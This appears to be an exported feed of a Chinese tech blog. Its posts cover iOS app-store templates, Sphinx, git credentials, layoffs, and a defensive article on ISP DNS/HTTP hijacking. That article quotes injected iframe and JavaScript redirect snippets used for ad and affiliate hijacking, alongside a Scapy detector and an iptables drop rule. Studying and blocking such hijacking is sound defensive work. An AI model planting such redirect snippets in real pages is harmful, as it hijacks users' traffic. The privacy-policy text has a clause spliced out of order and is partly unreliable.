<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/04/apple-app-5/">iOS APP提交审核，页面显示存在一个或多个错误的解决办法</a></li><li><a href="https://thelighter.github.io/2020/02/03/apple-app-2/">苹果上架app——技术支持网页模板</a></li><li><a href="https://thelighter.github.io/2020/02/03/apple-app-1/">苹果上架app——隐私政策网页内容模板</a></li></ul></div>]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios上架</tag>
      </tags>
  </entry>
  <entry>
    <title>苹果上架app——技术支持网页模板</title>
    <url>/2020/02/03/apple-app-2/</url>
    <content><![CDATA[<p>如何编写ios app的技术支持网页<br><a id="more"></a></p>
<p>网页不需要太多信息只需要留下可以联系到的电话或者邮箱即可</p>
<p>例如<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">联系邮箱：12345@qq.com</span><br><span class="line">联系电话：123456789</span><br></pre></td></tr></table></figure></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/04/apple-app-5/">iOS APP提交审核，页面显示存在一个或多个错误的解决办法</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-3/">苹果app构建版本上传后没有显示如何解决</a></li><li><a href="https://thelighter.github.io/2020/02/03/apple-app-1/">苹果上架app——隐私政策网页内容模板</a></li></ul></div>]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios上架</tag>
      </tags>
  </entry>
  <entry>
    <title>苹果上架app——隐私政策网页内容模板</title>
    <url>/2020/02/03/apple-app-1/</url>
    <content><![CDATA[<p>苹果上架app——隐私政策网页内容模板<br><a id="more"></a></p>
<p>本应用尊重并保护所有使用服务用户的个人隐私权。为了给您提供更准确、更有个性化的服务，本应用会按照本隐私权政策的规定使用和披露您的个人信息。但本应用将以高度的勤勉、审慎义务对待这些信息。除本隐私权政策另有规定外，在未征得您事先许可的情况下，本应用不会将这些信息对外披露或向第三方提供。本应用会不时更新本隐私权政策。 您在同意本应用服务使用协议之时，即视为您已经同意本隐私权政策全部内容。本隐私权政策属于本应用服务使用协议不可分割的一部分。</p>
<p>适用范围<br>(a) 在您注册本应用帐号时，您根据本应用要求提供的个人注册信息；</p>
<p>(b) 在您使用本应用网络服务，或访问本应用平台网页时，本应用自动接收并记录的您的浏览器和计算机上的信息，包括但不限于您的IP地址、浏览器的类型、使用的语言、访问日期和时间、软硬件特征信息及您需求的网页记录等数据；</p>
<p>(c) 本应用通过合法途径从商业伙伴处取得的用户个人数据。</p>
<p>您了解并同意，以下信息不适用本隐私权政策：</p>
<p>(a) 您在使用本应用平台提供的搜索服务时输入的关键字信息；</p>
<p>(b) 本应用收集到的您在本应用发布的有关信息数据，包括但不限于参与活动、成交信息及评价详情；</p>
<p>(c) 违反法律规定或违反本应用规则行为及本应用已对您采取的措施。</p>
<p>信息使用<br>(a)本应用不会向任何无关第三方提供、出售、出租、分享或交易您的个人信息，除非事先得到您的许可，或该第三方和本应用（含本应用关联公司）单独或共同为您提供服务，且在该服务结束后，其将被禁止访问包括其以前能够访问的所有这些资料。</p>
<p>(b) 本应用亦不允许任何第三方以任何手段收集、编辑、出售或者无偿传播您的个人信息。任何本应用平台用户如从事上述活动，一经发现，本应用有权立即终止与该用户的服务协议。</p>
<p>(c) 为服务用户的目的，本应用可能通过使用您的个人信息，向您提供您感兴趣的信息，包括但不限于向您发出产品和服务信息，或者与本应用合作伙伴共享信息以便他们向您发送有关其产品和服务的信息（后者需要您的事先同意）。</p>
<p>信息披露<br>在如下情况下，本应用将依据您的个人意愿或法律的规定全部或部分的披露您的个人信息：</p>
<p>(a) 经您事先同意，向第三方披露；</p>
<p>(b)为提供您所要求的产品和服务，而必须和第三方分享您的个人信息；</p>
<p>(c) 根据法律的有关规定，或者行政或司法机构的要求，向第三方或者行政、司法机构披露；</p>
<p>(d) 如您出现违反中国有关法律、法规或者本应用服务协议或相关规则的情况，需要向第三方披露；</p>
<p>(e) 如您是适格的知识产权投诉人并已提起投诉，应被投诉人要求，向被投诉人披露，以便双方处理可能的权利纠纷；</p>
<p>(f) 在本应用平台上创建的某一交易中，如交易任何一方履行或部分履行了交易义务并提出信息披露请求的，本应用有权决定向该用户提供其交易对方的联络方式等必要信息，以促成交易的完成或纠纷的解决。</p>
<p>(g) 其它本应用根据法律、法规或者网站政策认为合适的披露。</p>
<p>信息存储和交换<br>本应用收集的有关您的信息和资料将保存在本应用及（或）其关联公司的服务器上，这些信息和资料可能传送至您所在国家、地区或本应用收集信息和资料所在地的境外并在境外被访问、存储和展示。</p>
<p>Cookie的使用<br>(a) 在您未拒绝接受cookies的情况下，本应用会在您的计算机上设定或取用cookies ，以便您能登录或使用依赖于cookies的本应用平台服务或功能。本应用使用cookies可为您提供更加周到的个性化服务，包括推广服务。</p>
<p>(b) 您有权选择接受或拒绝接受cookies。您可以通过修改浏览器设置的方式拒绝接受cookies。但如果您选择拒绝接受cookies，则您可能无法登录或使用依赖于cookies的本应用网络服务或功能。</p>
<p>(c) 通过本应用所设cookies所取得的有关信息，将适用本政策。</p>
<p>信息安全<br>(a) 本应用帐号均有安全保护功能，请妥善保管您的用户名及密码信息。本应用将通过对用户密码进行加密等安全措施确保您的信息不丢失，不被滥用和变造。尽管有前述安全措施，但同时也请您注意在信息网络上不存在“完善的安全措施”。</p>
<p>(b) 在使用本应用网络服务进行网上交易时，您不可避免的要向交易对方或潜在的交易对</p>
<p>7.本隐私政策的更改</p>
<p>(a)如果决定更改隐私政策，我们会在本政策中、本公司网站中以及我们认为适当的位置发布这些更改，以便您了解我们如何收集、使用您的个人信息，哪些人可以访问这些信息，以及在什么情况下我们会透露这些信息。</p>
<p>(b)本公司保留随时修改本政策的权利，因此请经常查看。如对本政策作出重大更改，本公司会通过网站通知的形式告知。</p>
<p>方披露自己的个人信息，如联络方式或者邮政地址。请您妥善保护自己的个人信息，仅在必要的情形下向他人提供。如您发现自己的个人信息泄密，尤其是本应用用户名及密码发生泄露，请您立即联络本应用客服，以便本应用采取相应措施。</p>
<p>作者：崠崠<br>链接：<a href="https://www.jianshu.com/p/effc36712a3f" target="_blank" rel="noopener">https://www.jianshu.com/p/effc36712a3f</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/04/apple-app-5/">iOS APP提交审核，页面显示存在一个或多个错误的解决办法</a></li><li><a href="https://thelighter.github.io/2020/02/04/apple-app-3/">苹果app构建版本上传后没有显示如何解决</a></li><li><a href="https://thelighter.github.io/2020/02/03/apple-app-2/">苹果上架app——技术支持网页模板</a></li></ul></div>]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios上架</tag>
      </tags>
  </entry>
  <entry>
    <title>sphinx教程，免费搭建你的文档网站</title>
    <url>/2020/01/30/sphinx/</url>
    <content><![CDATA[<p>如何建立免费的文档<br><a id="more"></a></p>
<h1 id="Sphinx-本地环境搭建和编写文档"><a href="#Sphinx-本地环境搭建和编写文档" class="headerlink" title="Sphinx 本地环境搭建和编写文档"></a>Sphinx 本地环境搭建和编写文档</h1><p><code>pip install sphinx  # 安装sphinx</code><br>sphinx是使用最广泛的文档框架，快速生成文档资源，是基于python环境的模块，这里你需要拥有python3.6以上的环境。</p>
<p><code>pip install sphinx_rtd_theme # 安装readthedocs主题</code><br>本主题图一示例的主题，也是比较常见的，而默认的是flask官方文档的主题，这里建议使用sphinx_rtd_theme主题。我们需要在conf.py中将主题改为sphinx_rtd_theme。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sphinx_rtd_theme</span><br><span class="line">html_theme = &quot;sphinx_rtd_theme&quot;</span><br><span class="line">html_theme_path = [sphinx_rtd_theme.get_html_theme_path()]</span><br></pre></td></tr></table></figure></p>
<p><code>原来的html_theme = &#39;alabaster&#39; # 这里注释掉</code><br>开始创建<br><code>sphinx-quickstart</code><br>这个命令可以快速创建文档的，这里需要填写一些文档的信息，包含版本、名称、作者和语言等等。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Separate source and build directories (y/n) [n]:y</span><br><span class="line">&gt; Project name: scrapy-cookbook</span><br><span class="line">&gt; Author name(s): Xiong Neng</span><br><span class="line">&gt; Project version []: 0.2</span><br><span class="line">&gt; Project release [1.0]: 0.2.2</span><br><span class="line">&gt; Project language [en]: zh_CN</span><br></pre></td></tr></table></figure></p>
<p><strong>原文转自 karl科技站——<a href="https://xwtech.site/?p=92" target="_blank" rel="noopener">https://xwtech.site/?p=92</a></strong></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/16/python-3/">python的深拷贝和浅拷贝区别</a></li><li><a href="https://thelighter.github.io/2019/05/26/python-ai/">python人工智能必会的模块扩展</a></li><li><a href="https://thelighter.github.io/2019/05/26/requeset-1/">Python Requests用法总结大全</a></li></ul></div>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>运营商劫持分类和解决办法</title>
    <url>/2020/01/24/jiechi/</url>
    <content><![CDATA[<p>抵抗劫持从我做起！<br><a id="more"></a></p>
<ol>
<li>引言</li>
</ol>
<p>0x1: 原始的 DNS 投毒(DNS劫持)</p>
<p>DNS 作为互联网的基础设施之一，起到把域名转换成 IP 地址的作用，比如 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> –&gt; 115.239.211.112 。<br>各大运营商通常会以省为单位建设 2-4 台递归(或缓存)DNS 给用户使用，在 PPPoE 拨号时自动配置。 假若用户输错了域名，正常情况下 DNS 服务器会返回 NXDOMAIN(nonexistent domain)错误，然后浏览器或应用程序会报「域名无法解析」错误<br>运营商通常会对 NXDOMAIN 结果进行污染，返回一个假冒的 IP 地址，这个 IP 地址指向运营商的服务器，于是你便看到了「贴心」的满屏广告的各种网址纠错页。<br>这种方式简单粗暴，用户一般也不会太反感，而且似乎也不会违反任何法律法规</p>
<p>0x2: 所谓的「良性」劫持(TCP劫持)</p>
<p>用户跨运营商访问网络时，运营商可能需要为用户支付网间结算费用。比如中国移动宽带用户访问位于中国电信网络的服务器，中国移动必须为这些流量或带宽支付给中国电信网间结算费用<br>由于众所周知的原因，网间结算费用十分昂贵，为了节省网间互联费用，部分运营商部署了缓存服务器，在用户跨网访问时，采用技术手段将用户与目标服务器的连接劫持到自家的缓存服务器上</p>
<p>全站 HTTPS 是大势所趋，可以预见，在 HTTPS 流量越来越多的前提下，缓存劫持将变得越来越没有意义。和各大网站合作发展 CDN 才是王道<br>0x3: 「良性」劫持的危害(网间访问缓存)</p>
<p>复制代码</p>
<ol>
<li><p>可能造成网站和 APP 功能故障<br> 1) 运营商的网间缓存更新时间及失效时间对用户和网站不可控，缓存的旧数据和新数据无法在时间上保持一致性，可能引发一些”奇怪”的问题。比如</p>
<pre><code>1.1) 好多软件的最新版本下载地址是不变的，由于缓存的原因会让你一直下载到旧版本。这可能会影响到部分软件的自动更新、自动升级功能
1.2) 还有如网页中部分资源引用到旧数据导致网页排版和功能异常，验证码被缓存导致验证码怎么都输不对等问题 
</code></pre><p> 2) 由于劫持的方式是使用 HTTP 302 重定向指令，有的应用可能只接受 HTTP 200 OK 为正确的响应，不会识别 HTTP 302 Found 指令，造成通信故障。<br> 3) 劫持后网址发生变化，可能会触发浏览器和部分程序的跨站保护功能，导致网页上的脚本程序无法执行。或者由于相对路径发生变化导致 HTTP 404 错误<br> 4) 从技术上缓存系统只能通过 URL 来区别不同的资源，不能识别具有相同 URL 的不同资源，这会导致资源加载错误。比如</p>
<pre><code>4.1) 看视频时，出现前一段和后一段内容不一致
4.2) 下载 Windows 7 系统的驱动结果下载完成后发现是 Windows XP 的驱动
4.3) 带有敏感用户信息的文件被缓存后对所有人可见等安全问题 
</code></pre></li>
<li><p>缓存服务器具备篡改或出售缓存数据的隐患，对信息安全不利。目前部分地区的用户已经在网上讨论过下载 A 软件却被替换成 B 软件的情况 </p>
</li>
<li>缓存服务器故障时，会造成大量用户”部分URL断网” </li>
<li>缓存服务器带宽和处理性能有限，据网上反映由于缓存服务器经常报 HTTP 403、502 错误，导致资源无法加载，或由于缓存服务器超载导致加载速度缓慢  </li>
<li>缓存服务器可能触发部分网站的反爬虫(反机器人)、反盗链机制，缓存的内容是服务器报错信息，导致资源无法加载 </li>
<li>破坏了 URL 对用户的透明性。假设用户将劫持后的链接分享给其他人，而联通对缓存服务器做了访问控制，将会导致链接无法在外部打开；另外如果缓存失效而又没有及时更新的话，可能导致用户无法通过此 URL 访问被引用的资源 </li>
<li>损害了 IDC 和 CDN 的利益，此种网络劫持使 IDC 和 CDN 的流量大幅减少，影响 IDC 和 CDN 的流量收入 </li>
<li>目前联通的劫持依靠 TCP 抢答的方式，但原始数据包还是会到达目标服务器并被正确响应。造成的结果就是<br> 1) 虽然你访问资源时被 HTTP 302 数据包重定向到了联通的缓存服务器，但原目标服务器的 HTTP 200 响应还是会被送到用户端，且由于得不到用户端的确定不断触发超时重传，极大地浪费了用户带宽<br> 2) ISP通过流量镜像的方法抢在原目标服务之前向用户端response了数据包，但原目标服务器的 HTTP 200 响应还是会被送到用户端，用户端收到这个”重复的response包”之后，会向原目标服务器发送RST包<br>复制代码<br>0x4: 采用 HTTP 302 跳转进行缓存劫持而不是直接反向代理篡改原始数据原因</li>
</ol>
<p>HTTP 302 跳转方式部署起来最容易，成本最低。因为不需要对原有设备进行改造，只需要在交换机上以分光并联的方式进行连接即可。劫持设备的 DPI(深度包检测)系统可以实时探测用户和正常服务器的通信内容，可根据网络状况、劫持服务器负载、用户身份、访问内容、劫持概率等按需进行劫持。劫持时，只要伪造目标服务器的身份抢在真正的服务器之前向用户发送一条 HTTP 302 报文让用户跳转到新地址即可完成劫持。劫持设备与路由设备分离，方便维护<br>而如果直接篡改原始数据，则需要对原有设备进行改造，串联进路由设备，对每一个通过的数据包进行探测，决定放行或劫持。由于无法从目的 IP 判断数据包应发往真正的服务器还是截持服务器，这种系统还要为每个用户维护一份连接会话信息来作区分。可以想象的是，这套系统将对网络性能产生巨大的负面影响，并且难以维护</p>
<p>0x5: IPUSH</p>
<ol>
<li>网络定向直投系统(也称IPUSH)，是由中国电信开发的划时代网络技术，可以以各种格式定时、定点将广告推送到网络在线用户端的浏览主页面。通过这个传播平台,不论电信用户在IE浏览器地址栏中输入任何网址进行浏览，网络定向直投系统均可将广告主动送达用户，不依赖于某个固定的网站。可以自由选择目标市场区域，灵活投放，全面覆盖</li>
<li>IPUSH提供用户在相关搜索引擎(百度、google)输入内容，系统通过输入内容中的关键字，向用户推送与关键字绑定的图片、动画等多媒体交互式广告内容</li>
<li>根据用户访问的网站地址，推送与指定网站URL绑定的广告内容</li>
<li>以区域为单位,以宽带用户为依托的电信级网关广告<br>网络定向直投广告的表现形式</li>
</ol>
<p>复制代码</p>
<ol>
<li><p>URL全屏定向直投<br>只要是指定地区的宽带用户上网浏览内容，系统就向其点对点推送广告，第一时间独占了目标受众的眼球</p>
</li>
<li><p>超级搜索引擎<br>根据受众在百度或者google进行关键字搜索的在线及时行为，自动触发与关键字绑定的广告，精准得出现在此类产品感兴趣的目标受众面前，在所有参与搜索引擎竞价排名的竞争对手中独占鳌头</p>
</li>
<li><p>用户上网行为广告推送<br>根据受众在网上浏览某个网站或网站的某个栏目，系统自动判断对产品感兴趣的受众，从而主动向该受众定向推送交互式的全屏广告<br>复制代码<br>网络定向方式</p>
</li>
<li><p>地域定向推送: 针对不同区域的用户，在指定时间段内上网，即自动跳出互动广告</p>
</li>
<li>关键字搜索: 可以在普通用户进行搜索行为时，根据预设的关键字自动跳出互动广告</li>
<li>特定网址绑定: 绑定指定网站/页面，一旦用户访问相应网站/页面，自动跳出互动广告<br>目前存在的网络广告形式以弹出窗口、浮动广告、固定广告为主，但其局限广告在执行站点上展示，而且容易被浏览器或第三方软件所屏蔽。而网络定向直投的系统无论用户访问任何网页，都能及时收到由网络定向直投系统推送的广告，并且不会被目前已知的任何插件或空间屏蔽，极大的增加了广告投放的成功率</li>
</ol>
<p>通过置换页面的形式和电信网络的组合利用，避开各类软件的屏蔽</p>
<ol start="2">
<li>DNS劫持</li>
</ol>
<p>在中国，由于全国各地区被各个网络运营商分割，并且考虑到互相之间的利益关系以及网络访问速度，DNS解析的流程其实相当”复杂”，路径非常之多</p>
<p>0x1: 运营商区域DNS Server遭到缓存投毒攻击</p>
<p>CVE-2007-2926</p>
<p>Relevant Link:</p>
<p><a href="https://security.tencent.com/index.php/blog/msg/14" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/14</a></p>
<ol start="3">
<li>HTTP 劫持</li>
</ol>
<p>HTTP 协议本身未提供任何的安全措施，你和服务器之间的通信可以被任何中间设备窃听、记录、篡改，甚至目标服务器本身都可以伪造</p>
<ol>
<li>上网时正常页面被植入广告或恶意代码，连使用手机 APP 都不能幸免</li>
<li>上 A 网站却有一定机率被跳转到 B 网站</li>
<li>访问网站被多次跳转并被添加返利小尾巴等<br>由于信息不加密，意味著运营商可以随意记录并出售你的上网数据。更为安全的 HTTPS 协议则完全没有上述提到的问题，只要你别忽略浏览器的报的证书错误(如访问 12306.cn 时)，你和服务器之间的连接就是安全的。之前淘宝没启用 HTTPS 加密连接之前，经常有人在淘宝上买完东西后马上收到诈骗电话，订单号、收件人等各种私密信息均被泄露，估计和某些运营商脱不了关系，这种劫持属于违法甚至犯罪行为<br>目前，国内外的许多网站已开启全站 HTTPS 加密，如 Google 的各类产品(包括 YouTube)、 Facebook 、 Twitter 、 Wikipedia 、淘宝、天猫、百度搜索。另外知乎和 V2EX 都已支持 HTTPS 方式访问(但没有强制 HTTPS)，听京东的同学讲京东也正在测试全站 HTTPS 。 Google 已经表示对于启用全站 HTTPS 的站点，在搜索排名上会优先显示，鼓励各网站启用 HTTPS 。新版的 Chrome 和 Firefox 浏览器已经支持速度更快的 HTTP/2 ，但只支持启用了 HTTPS 的站点。可见，将来会有越来越多的网站转而使用 HTTPS ，明文的 HTTP 会被冷落， HTTP 劫持终会成为历史</li>
</ol>
<p>0x1: 运营商HTTP劫持的原理</p>
<p>在用户的浏览器连上被访问的网站服务器，发送了HTTP请求后，运营商的路由器会首先收到此次HTTP请求，之后运营商路由器的旁路设备标记此TCP连接为HTTP协议，之后可以抢在网站服务器返回数据之前发送HTTP协议的302代码进行下载软件的劫持，浏览器收到302代码后就会跳转到错误的软件下载地址下载软件了，随后网站服务器的真正数据到达后反而会被丢弃(客户端会向原目标server发送RST包)，或者，旁路设备在标记此TCP连接为HTTP协议后，直接返回修改后的HTML代码，导致浏览器中被插入了运营商的广告，随后网站服务器的真正数据到达后最终也是被丢弃</p>
<ol>
<li>客户端C向服务器S发出一个HTTP请求 </li>
<li>运营商网关将该请求分光(复制)送到缓存服务器 </li>
<li>缓存服务器如果发现命中缓存，则伪装成S返回一个302响应，该响应通常比S的正确响应早到，因此C接受了该响应，而忽略了S的响应，从而跳转到缓存服务器取数据<br>//这同时也是伟大的墙发送RST的方法<br>0x2: 劫持的现象</li>
</ol>
<p>ISP运营商抢在原始目标Server之前向客户端发送Response回包，回包的内容已经是”劫持后的数据”，劫持的形式包括</p>
<p>复制代码</p>
<ol>
<li>ISP直接返回一个302<br> 1) 跳转到一个新的URL(例如404页面)<br> 2) 继续跳转原始URL，但是在尾部加上”小尾巴”，例如广告联盟(包括返利): <a href="http://www.baidu.com/s?wd=test&amp;tn=SE_pshl0065_bassux8m。这个&quot;小尾巴&quot;表示来源渠道商，用户带上这个小尾巴访问目标网站后(例如百度)，目标网站需要向广告联盟支付推广费用，TCP流量劫持参与者就可以从中获利" target="_blank" rel="noopener">www.baidu.com/s?wd=test&amp;tn=SE_pshl0065_bassux8m。这个&quot;小尾巴&quot;表示来源渠道商，用户带上这个小尾巴访问目标网站后(例如百度)，目标网站需要向广告联盟支付推广费用，TCP流量劫持参与者就可以从中获利</a></li>
<li>ISP在原始网页(缓存中)中增加新内容<br> 1) iframe:  <frame src="http://zgshihu.com/z/z_sz.php" name="fb" frameborder="0"><br> 2) js跳转链接: <script type="text/javascript">parent.location.href=”<a href="http://www.amazon.cn?tag=eqifa5307-23&amp;ascsubtag=704747|1|&quot;">http://www.amazon.cn?tag=eqifa5307-23&amp;ascsubtag=704747|1|&quot;</a>; </script><br>复制代码<br>比较典型的是将大型电商网站的流量导到返利联盟，通过返利联盟获得当前用户成交金额的返利</li>
</ol>
<ol start="4">
<li><p>路由软件中植入劫持代码、用户PC本地木马</p>
</li>
<li><p>劫持弹广告检测、防御手段</p>
</li>
</ol>
<p>0x3: HTTPS</p>
<p>0x4: TTL检测</p>
<p>一般 ISP 劫持的时候不会去处理 TTL 。理论上可以根据 TTL 来追踪到哪一点出了问题，一次TCP会话中TTL值相差很大或者IPId突然跳变</p>
<p>0x5: 攻击源定位</p>
<p>复制代码</p>
<ol>
<li>tracert 被劫持的目标网站IP，得到每一跳的路由IP，并且得到一个正常情况下的Standar TTL<br>//TCP劫持设备(旁路侦听数据包)一般是基于包而非状态的，我们构造被侦听的数据包(也就是直接发出访问目前Server IP的HTTP请求TCP 包，不需要三次握手)多次发送，TTL值从1开始递增，精确地传递数据包到每一个路径上，直到出现伪造响应——没有问题的位置是不会有响应的，第一个出现 伪造响应的位置就是出问题的位置</li>
<li>用python的Scapy向目标被劫持Server IP发送TCP包，TTL从0开始递增</li>
<li>正常情况下TTL只有到达Standar TTL才会收到目标Server的正常回包，但是如果链路上发生了TCP劫持，在TTL还未到达Standar TTL之前就会收到正常回包，因为旁路劫持设备不会去检测请求包的TTL词，它会以为当前收到的请求包是一个正常的访问请求，会尝试抢在原始目标Server之前发送缓存中的数据包</li>
<li>在客户端看到的现象就是会收到一个Time-to-live Exceeded的ICMP包、以及一个来自原始Server IP的正常回包<br>复制代码<br>0x6: Id(Identification)检测</li>
</ol>
<p>例如真实包的TTL是53，Id是按顺序自增的，而伪造的包的TTL是64，Id始终是0</p>
<p>技术分享</p>
<p>技术分享</p>
<p>0x7: Scapy检测脚本</p>
<p>复制代码</p>
<p>#!/bin/python</p>
<h1 id><a href="#" class="headerlink" title=" "></a> </h1><p># </p>
<p>import sys<br>from scapy.all import *<br>conf.verb=0</p>
<p>print “TCP Hijacking Delector by lake2”<br>print “[+] Sniffing ….”<br>ip_arr = {}<br>while 1:<br>    a=sniff( filter=”tcp and src host not 10.26.234.44”, count=50)<br>    for b in a:<br>        ip_src = b.sprintf(r”%IP.src%”)<br>        ip_ttl = b.sprintf(r”%IP.ttl%”)<br>        if ip_arr.has_key(ip_src):<br>            c = int(ip_ttl) - int(ip_arr[ip_src])<br>            if abs(c) &gt; 4:<br>                print ip_src + “ has been hijacking !!!   current pack‘s ttl : “ + str(ip_ttl) + “  <-> “ + str(ip_arr[ip_src])<br>        else:<br>            ip_arr[ip_src] = ip_ttl<br>    print “=&gt;”<br>复制代码<br>0x8: iptables阻断劫持设备抢先返回的劫持包</-></p>
<p>iptables -A FORWARD -p tcp –sport 80 -m string –string “Location: <a href="http://59.108.200.39&quot;" target="_blank" rel="noopener">http://59.108.200.39&quot;</a> –algo bm -j DROP<br>//该规则的意义是，如果某个HTTP响应包中含有 Location: <a href="http://59.108.200.39" target="_blank" rel="noopener">http://59.108.200.39</a> 字样，就直接丢弃。这样后续S真实的响应包就能被客户端接收，从而保证正确的通信</p>
<ol start="6">
<li><p>检测方案</p>
</li>
<li><p>从流量中过滤出RST包，并保存dst ip</p>
</li>
<li>这些dst ip可能是遭到了ISP的TCP劫持，这些ip相当于一个”高疑似度IP”，很有可能是电商、大型网站</li>
<li>下一步需要拿全国各省各市的ADSL拨号，拨入对应城市三级ISP的网络中</li>
<li>循环发1000 TCP包，检测这个过程中是否发生”TTL波动”，即如果当地存在ISP TCP劫持，则收到的TTL值和访问正常网站的TTL值多数情况下会不一样，即使运营商采取了随机插入的策略，在多次(1000次以上)访问过程中，也有很大几率产生TTL差值波动</li>
<li>最终得到的是存在ISP TCP劫持的ISP城市</li>
</ol>
<h1 id="针对以上的解决办法"><a href="#针对以上的解决办法" class="headerlink" title="针对以上的解决办法"></a>针对以上的解决办法</h1><h2 id="打电话投诉你的ISP"><a href="#打电话投诉你的ISP" class="headerlink" title="打电话投诉你的ISP"></a>打电话投诉你的ISP</h2><p>第二天就抓起电话怒喷运营商，当天他们就派了技术上门，在向其演示劫持现象并展示抓包后，他说会向上面反映巴拉巴拉。几天后，劫持停止。看v2ex的讨论，好像那段时间全国的联通都被劫持，后来可能因为投诉太多就停止了。</p>
<h2 id="在路由器或浏览器安装广告屏蔽工具"><a href="#在路由器或浏览器安装广告屏蔽工具" class="headerlink" title="在路由器或浏览器安装广告屏蔽工具"></a>在路由器或浏览器安装广告屏蔽工具</h2><p>居家必备。在这里想特别提一下safari也可以加载插件来屏蔽广告，个人觉得AdBlock的效果还不错。当然更彻底的方法是用Surge将相关域名block掉。当然这两项功能都需要IOS9的支持。</p>
<h2 id="尽量用HTTPS访问网站"><a href="#尽量用HTTPS访问网站" class="headerlink" title="尽量用HTTPS访问网站"></a>尽量用HTTPS访问网站</h2><p>厌倦了访问百度时被加上?hao=xxxxx的尾巴吗？访问<a href="https://www.baidu.com/吧。不过现在的Chrome好像都能够自动跳转到HTTPS。" target="_blank" rel="noopener">https://www.baidu.com/吧。不过现在的Chrome好像都能够自动跳转到HTTPS。</a></p>
]]></content>
  </entry>
  <entry>
    <title>如何使用vscode不必经常输入GitHub账号密码</title>
    <url>/2020/01/24/git-vscode/</url>
    <content><![CDATA[<p>如何使用vscode不频繁输入GitHub账号密码<br><a id="more"></a></p>
<h1 id="全局设定GitHub账号密码"><a href="#全局设定GitHub账号密码" class="headerlink" title="全局设定GitHub账号密码"></a>全局设定GitHub账号密码</h1><p><code>git config --global user.name &quot;用户名&quot;</code></p>
<p><code>git config --global user.email &quot;用户邮箱&quot;</code></p>
<h1 id="记住账号密码"><a href="#记住账号密码" class="headerlink" title="记住账号密码"></a>记住账号密码</h1><p>在你git的目录下输入<br><code>git config --global credential.helper store</code></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/01/02/git_2/">git最常用法大全，git必备技巧，程序员必会的git用法</a></li><li><a href="https://thelighter.github.io/2018/12/14/github_1/">如何更好地使用git工具，这里有最好的资料！</a></li><li><a href="https://thelighter.github.io/2018/11/20/githubraw/">Github上如何上传别人可以执行的shell代码？</a></li></ul></div>]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>面对行业的萧条如何自救</title>
    <url>/2020/01/05/coding/</url>
    <content><![CDATA[<p>程序员面对行业的不景气和侵犯权益的行为如何自救<br><a id="more"></a></p>
<h1 id="观察公司发展情况"><a href="#观察公司发展情况" class="headerlink" title="观察公司发展情况"></a>观察公司发展情况</h1><p>一般的公司到裁员的那一步基本就是公司内部已经出现问题了，所以在裁员之前是会有一些动作的，这些动作被捕捉到了之后可以自己早做打算，尽早计划planB，多条心眼也是很有必要的。</p>
<p>最开始一般是现金流出问题，比如报销周期拉长，比如发工资时间拉长，这些基本都是现金流问题的直接表现。间接表现也有是一些福利消减，健身房不在续费啊，零食没有了啊，等等。有时候也可以财务的同事打好关系，他们一般会第一时间知道一些财务状况问题。<br>公司的业务慢慢减少，公司里的员工慢慢无事可做的增多，这种情况预示着公司没有正常的业务源头了，很容易就裁员甚至砍掉部门来保证公司存活。<br>开始严格抓考勤或者公司纪律，这个也是常用手段之一，比如直接把上班时间提早且不准迟到之类的，这种就是公司想要抓住员工过错，想在赔偿阶段尽量少的出钱。<br>开始突然增加一些绩效考核项目，有时候会出台一些协议文件让你签署，比如达不到某个kpi就降薪之类的，这种协议切记不要随便签署。<br>有时候空降领导也会导致裁员，这种情况有时候不是公司本身出问题，通常情况是派系斗争失败换血裁员，或者是业务调整裁员，这种基本是要从公司内容掌握消息，和自己的老大，还有一些行政hr搞好关系说不定可以捕风捉影一些信息。</p>
<h1 id="被裁了怎么办"><a href="#被裁了怎么办" class="headerlink" title="被裁了怎么办"></a>被裁了怎么办</h1><p>那当你收到了裁员通知的时候，你得做什么：<br>重中之重！！ 第一件事情是注意你自己的社保，赶紧去查询一下自己的社保缴纳到什么时候，由于社保对我们的生活影响很大，断缴之后会很麻烦而且有些无法弥补，如果确认公司无法缴纳了，后续又不会马上找到新公司缴纳：<br>有些地区是可以自己缴纳，去当地社保局询问和缴纳即可，也有一些地区微信和支付宝也都可以，具体得自己去查阅当地情况。<br>上万能的某宝找挂靠缴纳。<br>找朋友的公司挂靠。<br>切记不要签署任何协议，即使要签署，每一行字都需要谨慎查看对待，不了解的时候，可以问一问自己法律相关的朋友，或者找找资料之类。<br>不要乱说话或者承诺任何事情，谨防hr录音，总之保留自己的权益即可。<br>和任何人，不仅限于hr或者领导谈话的时候，记得做好录音准备，原因大家都懂。<br>不要偏激的进行人身攻击，拳脚相加更是最好不要。</p>
<h1 id="如何保留证据"><a href="#如何保留证据" class="headerlink" title="如何保留证据"></a>如何保留证据</h1><p>如果公司是走正常裁员流程且有劳动法的赔偿，那么一切都好说；如果是非法裁员，那么保留一切你和公司有劳动合同的证据，以下列举这些证据不一定是全部都有用，但是都可以保留着以防万一。如果真的走到了需要去仲裁的地步，以下的材料最好全部都记得保留原件，复印件需要三份或者以上，并提前打印整理好，因为你至少需要上交到当地劳动局，甚至法院，或者律师等等，提前打印好以免到时候手忙脚乱浪费时间。</p>
